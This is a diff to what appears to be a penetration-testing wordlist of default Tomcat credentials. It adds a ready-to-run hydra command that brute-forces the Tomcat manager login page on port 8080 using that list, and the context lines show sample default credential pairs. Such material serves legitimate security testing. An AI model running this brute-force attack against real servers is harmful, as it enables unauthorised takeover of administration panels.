@@ -32,3 +32,7 @@ both:ads3cret
 both:adtomcat
 both:advagrant
 
+USE HYDRA
+==========
+
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://X.X.X.X:8080/manager/html
